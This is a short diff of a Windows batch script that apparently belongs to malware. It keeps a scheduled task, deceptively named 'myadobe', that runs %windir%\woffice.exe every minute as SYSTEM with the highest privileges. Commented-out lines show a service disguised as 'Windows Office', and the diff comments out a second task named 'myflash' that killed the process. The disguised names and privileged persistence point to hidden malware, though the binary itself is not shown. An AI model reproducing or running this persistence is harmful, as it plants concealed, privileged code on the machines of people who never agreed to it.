@@ -7,4 +7,4 @@ rem copy /y %windir%\wofficeie1.exe %windir%\wup.exe
 rem sc create wup binPath= "%windir%\wup.exe" DisplayName= "Windows Office" start= auto
 rem net start wup
 schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "%windir%\woffice.exe" /tn myadobe /rl highest /F
-schtasks /create /ru "SYSTEM" /sc minute /mo 10 /tr "taskkill /f /im woffice.exe" /tn myflash /rl highest /F
+rem schtasks /create /ru "SYSTEM" /sc minute /mo 3 /tr "taskkill /f /im woffice.exe" /tn myflash /rl highest /F
